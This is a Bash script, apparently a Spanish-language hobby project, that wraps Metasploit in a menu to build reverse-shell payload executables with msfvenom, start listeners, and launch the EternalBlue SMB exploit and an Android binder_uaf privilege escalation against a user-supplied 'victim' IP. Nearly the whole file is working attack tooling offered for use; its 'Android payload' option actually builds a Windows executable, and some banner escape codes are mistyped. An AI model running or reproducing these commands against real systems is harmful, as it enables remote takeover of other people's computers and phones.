#!/bin/bash

#Programa final de creacion de exploit y payload
#Este programa esta acabado completamente aunque si hay algun problema con el por cualquier cosa  como errores que puede que haya cometido pero no se vean a simple vista comentarlo en github y asi lo arreglare y tambien ayudara a mi aprendizaje sobre el BASH
#Saludos desde España 
#ilia









echo -n -e "\e[1;31m██████████████         ███                █████████████████                ███              \e[0m"                                                  
echo -n -e "\r[1;31m██████████████         ███                █████████████████               █████             \r[0m"                                                
echo -n -e "\e[1;31m      ███              ███                       ███                     ███ ███            \e[0m"                
echo -n -e "\r[1;31m      ███              ███                       ███                    ███   ███           \r[0m"              
echo -n -e "\e[1;31m      ███              ███                       ███                   ███     ███          \e[0m"
echo -n -e "\r[1;31m      ███              ███                       ███                  █████████████         \r[0m"                       
echo -n -e "\e[1;31m      ███              ███                       ███                 ███████████████        \e[0m"         
echo -n -e "\r[1;31m      ███              ███                       ███                ███            ███       \r[0m"
echo -n -e "\e[1;31m██████████████         ███████████        █████████████████        ███              ███     \e[0m"                   
echo -n -e "\r[1;31m██████████████         ███████████        █████████████████       ███                ███    \r[0m"                          

echo -n -e "Esta es l aprueba final y absoluta la cual esta completamente acabada y pulida.
Espero que les guste mi proyecto
Saludos "



sleep 20s


trap ctrl_c INT
function ctrl_c() {
    echo -e "\e[0;31m SALIENDO \e[0m"
    sleep 2s
    clear
    exit 0
}
function limpiar {
    clear
}
clear
sleep 2s
while :
do 
opcion=0
echo
echo -e "\e[1;33m   [1]\e[0m \e[1;34mWINDOWS PAYLOAD\e[0m"
echo -e "\e[1;33m   [2]\e[0m \e[1;34mANDROID PAYLOAD\e[0m"
echo -e "\e[1;33m   [3]\e[0m \e[1;34mWINDOWS EXPLOIT\e[0m"
echo -e "\e[1;33m   [4]\e[0m \e[1;34mANDROID EXPLOIT\e[0m"
echo -e "\e[1;33m   [5]\e[0m \e[1;34mSALIR\e[0m"
read opcion
case $opcion in 
1)
sleep 5s
echo -n -e "\e[1;33mDIRECCION IP :\e[0m"
read IP
sleep 2s
echo -n -e "\e[1;33mPUERTO DE CONEXION :\e[0m"
read PUERTO
sleep 2s
echo -n -e "\e[1;33mELIJE UN NOMBRE PARA LA APLICACION :\e[0m"
read NOMBRE
sleep 2s 

msfvenom -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$PUERTO -f exe -o $NOMBRE.exe

sleep 2s
sudo service postgresql start
sleep 2s 
clear
sleep 4s
msfconsole -x "use multi/handler;\
set PAYLOAD windows/meterpreter/reverse_tcp;\
set LHOST $IP;\
set LPORT $PUERTO;\
exploit"
read enterkey
;;
2)
sleep 5s
echo -n -e "\e[1;33mDIRECCION IP :\e[0m"
read IP
sleep 2s
echo -n -e "\e[1;33mPUERTO DE CONExION :\e[0m"
read PUERTO
sleep 2s
echo -n -e "\e[1;33mELIJA UN NOMBRE PARA LA APLICACION :\e[0m"
read NOMBRE
sleep 2s
msfvenom -p windows/shell/reverse_tcp LHOST=$IP LPORT=$PUERTO -f exe -o $NOMBRE.exe
sleep 2s
sudo service postgresql start
sleep 2s
clear
sleep 4s
msfconsole -x "use multi/handler;\
set PAYLOAD windows/shell/reverse_tcp;\
set LHOST $IP;\
set LPORT $PUERTO;\
exploit"
read enterkey
;;
3)
sleep 5s 
echo -n -e "\e[1;33mDIRECCION IP DE LA VICTIMA :\e[0m"
read IP
echo -n -e "\e[1;33mPUERTO :\e[0m"
read PORT
sleep 2s 
sudo service postgresql start
sleep 2s 
clear
sleep 4s
msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue;\
                set RHOSTS $IP;\
                set RPORT $PORT;\
                set VERIFY_ARCH;\
                set VERIFY_TARGET;\
                exploit"
read enterkey
;;
4)
sleep 5s
echo -n -e "\e[1;33mDIRECCION IP DE LA VICTIMA :\e[0m"
read IP
sleep 2s
echo -n -e "\e[1;33mSESSION :\e[0m"
read NUMERO
sleep 2s 
sudo service postgresql start
sleep 2s
clear
sleep 4s
msfconsole -x "use exploit/android/local/binder_uaf;\
                set SESSION $NUMERO;\
                set LHOST $IP;\
                run" 
read enterkey
;;
5)
clear
exit 0
read enterkey
;;
*)
clear
echo -e "\e[1;37mLa opcion\e[0m \e[1;33m[$opcion]\e[0m \e[1;37mno esta en la lista\e[0m \e[1;31m:(\e[0m"
read enterkey
;;
esac

echo "Gracias por usar esta herramienta"
sleep 4s
done




